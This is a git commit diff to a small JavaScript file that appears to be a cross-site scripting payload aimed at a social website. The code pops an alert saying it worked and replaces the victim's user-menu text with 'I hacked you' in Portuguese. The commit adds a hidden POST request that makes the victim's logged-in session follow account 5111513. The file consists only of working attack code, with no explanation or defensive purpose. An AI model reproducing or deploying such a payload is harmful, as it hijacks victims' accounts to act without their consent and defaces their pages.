1df0b3cc4831bad644c2ec83884f13cdaea913f6
kamimikaka <jessruss99@gmail.com>
2025-03-18 17:13:00 -0300

    Update kamimikaka.js

--- kamimikaka.js
+++ kamimikaka.js
@@ -1,4 +1,7 @@
 alert('Deu certo kkkkk');
 var testee = document.querySelector("#user-top > a.ml-10");
 testee.innerText = 'KKKK eu hackeei você!';
+
+const ab = ()=>{$.ajax({url: '/user/follow/5111513',type: 'post',success: function(data) {alert('OK!')}})};
+
 //kkkkkk
